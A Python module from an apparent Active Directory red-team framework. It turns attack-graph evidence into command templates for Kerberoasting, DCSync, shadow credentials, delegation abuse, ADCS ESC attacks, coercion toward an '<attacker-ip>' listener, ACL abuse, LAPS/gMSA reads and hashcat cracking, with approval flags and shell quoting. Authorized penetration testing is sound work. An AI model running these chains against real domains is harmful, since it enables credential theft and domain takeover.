"""Build operator-facing example commands from exploit-chain evidence.

Commands are templates for authorized operator use. They never auto-execute.
"""

from __future__ import annotations

import os
import re
import shlex
import string
from collections.abc import Iterable
from typing import Any

from ldap3.utils.conv import escape_filter_chars as _ldap_filter_value

from adaf_attack.core.target import Target

# terminal_relation → list of command templates
# Placeholders: {domain} {dc_ip} {sam} {target} {spn} {start} {end} {user}
COMMAND_TEMPLATES: dict[str, list[dict[str, Any]]] = {
    # ── Kerberos roasting / AS-REP ──────────────────────────────────────────
    "HasSPN": [
        {
            "capability": "kerberoast",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run kerberoast -d {domain} --dc-ip {dc_ip} -u {user} -P sam={sam}",
        }
    ],
    "CanASREP": [
        {
            "capability": "asrep-roast",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run asrep-roast -d {domain} --dc-ip {dc_ip} -u {user} -P users={sam}",
        }
    ],
    # ── DCSync ──────────────────────────────────────────────────────────────
    "DCSync": [
        {
            "capability": "dcsync",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run dcsync -d {domain} --dc-ip {dc_ip} -u {user} --force -P sam={sam}",
        }
    ],
    "GetChangesAll": [
        {
            "capability": "dcsync",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run dcsync -d {domain} --dc-ip {dc_ip} -u {user} --force",
        }
    ],
    "GetChanges": [
        {
            "capability": "dcsync",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run dcsync -d {domain} --dc-ip {dc_ip} -u {user} --force",
        }
    ],
    # ── Shadow Credentials / PKINIT ─────────────────────────────────────────
    "WriteKeyCredentialLink": [
        {
            "capability": "shadow-pkinit-workflow",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run shadow-pkinit-workflow -d {domain} --dc-ip {dc_ip} -u {user} --sam {sam} --force",
        }
    ],
    "HasKeyCredentialLink": [
        {
            "capability": "pkinit-auth",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run pkinit-auth -d {domain} --dc-ip {dc_ip} --sam {sam} --pfx ./shadow.pfx",
        }
    ],
    # ── Resource-Based Constrained Delegation ───────────────────────────────
    "WriteRBCD": [
        {
            "capability": "rbcd-ticket-workflow",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run rbcd-ticket-workflow -d {domain} --dc-ip {dc_ip} -u {user} --set-on {target} --set-from {start} --spn {spn} --impersonate {sam} --force",
        }
    ],
    "AllowedToAct": [
        {
            "capability": "s4u-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run s4u-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P impersonate={sam} -P spn={spn} --force",
        }
    ],
    "AllowedToDelegate": [
        {
            "capability": "constrained-delegation",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run constrained-delegation -d {domain} --dc-ip {dc_ip} -u {user} -P spn={spn} --force",
        }
    ],
    "UnconstrainedDelegation": [
        {
            "capability": "unconstrained-delegation",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run unconstrained-delegation -d {domain} --dc-ip {dc_ip} -u {user} -P host={target} --force",
        }
    ],
    # ── ADCS ESC ────────────────────────────────────────────────────────────
    "ESC1": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} --force",
        }
    ],
    "ESC1Enrollable": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} --force",
        }
    ],
    "ESC2": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=2 --force",
        }
    ],
    "ESC3": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=3 --force",
        }
    ],
    "ESC4": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=4 --force",
        }
    ],
    "ESC6": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P ca={target} -P esc=6 --force",
        }
    ],
    "ESC8": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P ca={target} -P esc=8 --force",
        }
    ],
    "ESC3Agent": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=3 --force",
        }
    ],
    "ESC8WebEnrollment": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P ca={target} -P esc=8 --force",
        }
    ],
    "ESC9": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=9 --force",
        }
    ],
    "ESC10": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=10 --force",
        }
    ],
    "ESC11": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=11 --force",
        }
    ],
    "ESC13": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=13 --force",
        }
    ],
    "ESC14": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=14 --force",
        }
    ],
    "ESC15": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=15 --force",
        }
    ],
    "ESC16": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": True,
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P ca={target} -P esc=16 --force",
        }
    ],
    # ── GPO / SYSVOL ────────────────────────────────────────────────────────
    "WriteGPO": [
        {
            "capability": "gpo-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run gpo-abuse -d {domain} --dc-ip {dc_ip} -u {user} --force -P gpo={target}",
        }
    ],
    "WriteSYSVOL": [
        {
            "capability": "gpo-sysvol",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run gpo-sysvol -d {domain} --dc-ip {dc_ip} -u {user} --force",
        }
    ],
    # ── Coercion ────────────────────────────────────────────────────────────
    "SpoolerOpen": [
        {
            "capability": "coerce",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run coerce -d {domain} --dc-ip {dc_ip} -u {user} -P host={target} -P listener='<attacker-ip>' -P methods=printerbug --force",
        }
    ],
    "EfsrpcOpen": [
        {
            "capability": "coerce",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run coerce -d {domain} --dc-ip {dc_ip} -u {user} -P host={target} -P listener='<attacker-ip>' -P methods=petitpotam --force",
        }
    ],
    "DfscoerceOpen": [
        {
            "capability": "coerce",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run coerce -d {domain} --dc-ip {dc_ip} -u {user} -P host={target} -P listener='<attacker-ip>' -P methods=dfscoerce --force",
        }
    ],
    # ── LAPS / gMSA ─────────────────────────────────────────────────────────
    "ReadGMSAPassword": [
        {
            "capability": "laps-read",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run laps-read -d {domain} --dc-ip {dc_ip} -u {user} -P computer_filter={computer_filter}",
        }
    ],
    "GMSAPasswordReadable": [
        {
            "capability": "laps-read",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run laps-read -d {domain} --dc-ip {dc_ip} -u {user}",
        }
    ],
    "ReadLAPSPassword": [
        {
            "capability": "laps-read",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run laps-read -d {domain} --dc-ip {dc_ip} -u {user} -P computer_filter={computer_filter}",
        }
    ],
    # ── ACL / ownership abuse (new) ─────────────────────────────────────────
    "GenericAll": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=GenericAll --force",
        }
    ],
    "GenericWrite": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=GenericWrite --force",
        }
    ],
    "WriteDacl": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=WriteDacl --force",
        }
    ],
    "WriteOwner": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=WriteOwner --force",
        }
    ],
    "Owns": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=Owns --force",
        }
    ],
    "ForceChangePassword": [
        {
            "capability": "force-change-password",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run force-change-password -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} --force",
        }
    ],
    "AddMember": [
        {
            "capability": "add-member",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run add-member -d {domain} --dc-ip {dc_ip} -u {user} -P group={target} -P member={sam} --force",
        }
    ],
    "AddSelf": [
        {
            "capability": "add-self",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run add-self -d {domain} --dc-ip {dc_ip} -u {user} -P group={target} --force",
        }
    ],
    # ── Session / local admin (new) ─────────────────────────────────────────
    "HasSession": [
        {
            "capability": "session-abuse",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run session-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P host={target}",
        }
    ],
    "AdminTo": [
        {
            "capability": "local-admin",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run local-admin -d {domain} --dc-ip {dc_ip} -u {user} -P host={target}",
        }
    ],
    "CanRDP": [
        {
            "capability": "rdp",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run rdp -d {domain} --dc-ip {dc_ip} -u {user} -P host={target}",
        }
    ],
    "CanPSRemote": [
        {
            "capability": "psremote",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run psremote -d {domain} --dc-ip {dc_ip} -u {user} -P host={target}",
        }
    ],
}

# Follow-ons are deliberately separate from the primary capability command.
# They are review-ready snippets: the operator still chooses the wordlist or
# artifact and must explicitly invoke every step.  Keeping them in the
# generated document lets a single operator move from evidence to offline
# cracking or vault import without having to remember filenames and modes.
SECONDARY_COMMAND_TEMPLATES: dict[str, list[dict[str, Any]]] = {
    "HasSPN": [
        {
            "label": "Crack RC4 TGS hashes",
            "kind": "hashcat",
            "risk": "offline",
            "cmd": "hashcat -m 13100 {hash_file} {wordlist}",
            "hash_file": "./kerberoast.hashes.txt",
        },
        {
            "label": "Crack AES TGS hashes",
            "kind": "hashcat",
            "risk": "offline",
            "cmd": "hashcat -m 19700 {hash_file} {wordlist}",
            "hash_file": "./kerberoast.hashes.txt",
        },
    ],
    "CanASREP": [
        {
            "label": "Crack AS-REP hashes",
            "kind": "hashcat",
            "risk": "offline",
            "cmd": "hashcat -m 18200 {hash_file} {wordlist}",
            "hash_file": "./asrep-roast.hashes.txt",
        }
    ],
    "HasKeyCredentialLink": [
        {
            "label": "Import the resulting Kerberos ticket",
            "kind": "ticket-import",
            "risk": "local-vault-write",
            "cmd": (
                "adaf-attack run ticket-lifecycle -d {domain} --dc-ip {dc_ip} "
                "-u {user} -P operation=import-ccache -P artifact={ticket_file}"
            ),
        }
    ],
    "WriteRBCD": [
        {
            "label": "Import the resulting Kerberos ticket",
            "kind": "ticket-import",
            "risk": "local-vault-write",
            "cmd": (
                "adaf-attack run ticket-lifecycle -d {domain} --dc-ip {dc_ip} "
                "-u {user} -P operation=import-ccache -P artifact={ticket_file}"
            ),
        }
    ],
    "AllowedToAct": [
        {
            "label": "Import the resulting Kerberos ticket",
            "kind": "ticket-import",
            "risk": "local-vault-write",
            "cmd": (
                "adaf-attack run ticket-lifecycle -d {domain} --dc-ip {dc_ip} "
                "-u {user} -P operation=import-ccache -P artifact={ticket_file}"
            ),
        }
    ],
    "AllowedToDelegate": [
        {
            "label": "Import the resulting Kerberos ticket",
            "kind": "ticket-import",
            "risk": "local-vault-write",
            "cmd": (
                "adaf-attack run ticket-lifecycle -d {domain} --dc-ip {dc_ip} "
                "-u {user} -P operation=import-ccache -P artifact={ticket_file}"
            ),
        }
    ],
    "UnconstrainedDelegation": [
        {
            "label": "Import the captured Kerberos ticket",
            "kind": "ticket-import",
            "risk": "local-vault-write",
            "cmd": (
                "adaf-attack run ticket-lifecycle -d {domain} --dc-ip {dc_ip} "
                "-u {user} -P operation=import-ccache -P artifact={ticket_file}"
            ),
        }
    ],
}


def _sam_from_node_id(node_id: str | None) -> str:
    """USER@alice@CORP.LOCAL → alice; COMPUTER@DC01$ → DC01$"""
    if not node_id:
        return "<sam>"
    parts = node_id.split("@")
    if len(parts) >= 2:
        return parts[1]
    return node_id


_SAFE_COMMAND_VALUE = re.compile(r"^[A-Za-z0-9_./:@%+=,-]+\$?$")
_WINDOWS_SHELL = os.name == "nt"


def shell_quote(value: str) -> str:
    """Quote a value unless it is a safe shell token.

    Computer accounts conventionally end in ``$``. Preserve that familiar
    display form while still quoting whitespace and shell metacharacters.

    Copy-ready commands use native PowerShell single-quote escaping on Windows
    and POSIX ``shlex.quote`` elsewhere. Prefer ``adaf-attack command`` /
    ``plan`` output as the operator contract rather than hand-editing quotes.
    """
    if _SAFE_COMMAND_VALUE.fullmatch(value) and not (_WINDOWS_SHELL and value.startswith("@")):
        return value
    if _WINDOWS_SHELL:
        return "'" + value.replace("'", "''") + "'"
    return shlex.quote(value)


def shell_dialect() -> str:
    """Return the native shell contract used for copy-ready commands."""
    return "powershell" if _WINDOWS_SHELL else "posix"


def render_command(argv: Iterable[str]) -> str:
    """Render an argument vector for the platform's native operator shell."""
    values = [str(value) for value in argv]
    rendered = [shell_quote(value) for value in values]
    command = " ".join(rendered)
    if _WINDOWS_SHELL and rendered and rendered[0] != values[0]:
        return f"& {command}"
    return command


# Backward-compatible alias for in-module call sites.
_shell_quote = shell_quote


def _approval_required(template: dict[str, Any]) -> bool:
    """Normalize legacy string flags while keeping the public result typed."""
    value = template.get("approval_required", False)
    if isinstance(value, str):
        return value.strip().lower() in {"1", "true", "yes", "required"}
    return bool(value)


# Keep the in-memory template schema typed even for older downstream code that
# mutates a template with the historical string value.
for _templates in COMMAND_TEMPLATES.values():
    for _template in _templates:
        _template["approval_required"] = _approval_required(_template)


def _node_value(chain: dict[str, Any], *keys: str) -> str | None:
    for key in keys:
        value = chain.get(key)
        if value is not None and str(value).strip():
            return str(value)
    return None


def _derive_spn(chain: dict[str, Any], target_name: str) -> str:
    """Choose an evidence-provided SPN before falling back to CIFS.

    Graph exporters use several names for service metadata.  Accepting all of
    them lets an operator copy a correct HTTP/MSSQL/LDAP service command
    instead of receiving an unconditional ``cifs/`` guess.
    """
    explicit = _node_value(chain, "spn", "target_spn", "service_spn")
    if explicit:
        return explicit
    service = _node_value(chain, "service", "service_class", "spn_service") or "cifs"
    host = _node_value(chain, "service_host", "host") or target_name
    return f"{service}/{host}"


def _format_template(command: str, context: dict[str, str]) -> str:
    """Format a command and make any missing field explicit and safe."""
    fields = {field_name for _, field_name, _, _ in string.Formatter().parse(command) if field_name}
    complete = dict(context)
    for field_name in fields - complete.keys():
        # Keep the command copy-ready while making missing evidence obvious.
        complete[field_name] = _shell_quote(f"<{field_name}>")
    return command.format(**complete)


def _secondary_context(context: dict[str, str], template: dict[str, Any]) -> dict[str, str]:
    values = dict(context)
    values["hash_file"] = str(template.get("hash_file") or "./hashes.txt")
    values["wordlist"] = "./wordlist.txt"
    values["ticket_file"] = "./ticket.ccache"
    return values


def _follow_on_commands(relation: str, context: dict[str, str]) -> list[dict[str, Any]]:
    """Render offline cracking and local ticket-import follow-ons."""
    results: list[dict[str, Any]] = []
    for template in SECONDARY_COMMAND_TEMPLATES.get(relation, []):
        rendered = _format_template(str(template["cmd"]), _secondary_context(context, template))
        results.append(
            {
                "label": str(template["label"]),
                "kind": str(template["kind"]),
                "risk": str(template["risk"]),
                "command": rendered,
                "terminal_relation": relation,
                "review_only": True,
            }
        )
    return results


def _fallback_command(relation: str, context: dict[str, str]) -> dict[str, Any]:
    """Return a useful review command when no relation template exists."""
    command = (
        f"adaf-attack plan {_shell_quote(relation or 'unknown-relation')}"
        f" -d {context['domain']} --dc-ip {context['dc_ip']}"
    )
    if context["user"] != _shell_quote("<user>"):
        command += f" -u {context['user']}"
    command += f" -P start={context['start']} -P end={context['end']}"
    return {
        "capability": f"plan:{relation or 'unknown-relation'}",
        "risk": "unknown",
        "approval_required": False,
        "command": command,
        "terminal_relation": relation,
        "fallback": True,
        "reason": "No capability template is registered for this relation; review the evidence first.",
    }


def emit_ranked_paths(
    chains: list[dict[str, Any]],
    target: Target,
    *,
    operator_user: str | None = None,
) -> list[dict[str, Any]]:
    """Attach copy-ready command examples to ranked evidence chains.

    Ranking remains owned by :class:`AttackGraph`; this function only enriches
    already-ranked evidence and is safe to use from offline integrations.
    """
    return [
        dict(
            chain,
            example_commands=build_exploit_commands(
                chain, target, operator_user=operator_user or target.username
            ),
        )
        for chain in chains
    ]


def build_exploit_commands(
    chain: dict[str, Any],
    target: Target,
    *,
    operator_user: str | None = None,
    spn: str | None = None,
) -> list[dict[str, Any]]:
    """Return safe, parameterized example commands for one exploit chain.

    Values are shell-quoted independently.  ``spn`` is an explicit override
    for operators who have validated a service target outside the graph.
    Unknown relations produce a review-only ``plan:...`` fallback rather than
    silently discarding the evidence.
    """
    relation = str(chain.get("terminal_relation") or "")
    templates = COMMAND_TEMPLATES.get(relation, [])

    start = chain.get("start")
    end = chain.get("end")
    start_name = _node_value(chain, "start_sam") or _sam_from_node_id(start)
    end_name = _node_value(chain, "end_sam", "sam") or _sam_from_node_id(end if end else start)
    sam = end_name
    user = operator_user or target.username or "<user>"

    raw_context = {
        "domain": _node_value(chain, "target_domain", "domain") or target.domain or "<domain>",
        "dc_ip": _node_value(chain, "target_dc_ip", "dc_ip") or target.dc_ip or "<dc-ip>",
        "user": user,
        "sam": sam,
        "start": start_name,
        "end": end_name,
        "target": _node_value(chain, "target", "target_sam") or end_name,
        "spn": spn or _derive_spn(chain, end_name),
        "computer_filter": f"(sAMAccountName={_ldap_filter_value(sam)})",
    }
    # Quote substituted values individually so generated examples remain safe
    # to paste when an operator name, domain, or filter contains whitespace or
    # shell metacharacters. Simple values are unchanged by shlex.quote().
    quoted_ctx = {key: _shell_quote(str(value)) for key, value in raw_context.items()}

    if not templates:
        fallback = _fallback_command(relation, quoted_ctx)
        follow_ons = _follow_on_commands(relation, quoted_ctx)
        if follow_ons:
            fallback["follow_on_commands"] = follow_ons
        return [fallback]

    out: list[dict[str, Any]] = []
    for t in templates:
        try:
            cmd = _format_template(str(t["cmd"]), quoted_ctx)
        except (KeyError, ValueError):
            cmd = str(t["cmd"])
        item = {
            "capability": t["capability"],
            "risk": t["risk"],
            "approval_required": _approval_required(t),
            "command": cmd,
            "terminal_relation": relation,
        }
        follow_ons = _follow_on_commands(relation, quoted_ctx)
        if follow_ons:
            item["follow_on_commands"] = follow_ons
        out.append(item)
    return out


__all__ = [
    "COMMAND_TEMPLATES",
    "SECONDARY_COMMAND_TEMPLATES",
    "build_exploit_commands",
    "emit_ranked_paths",
    "shell_quote",
]
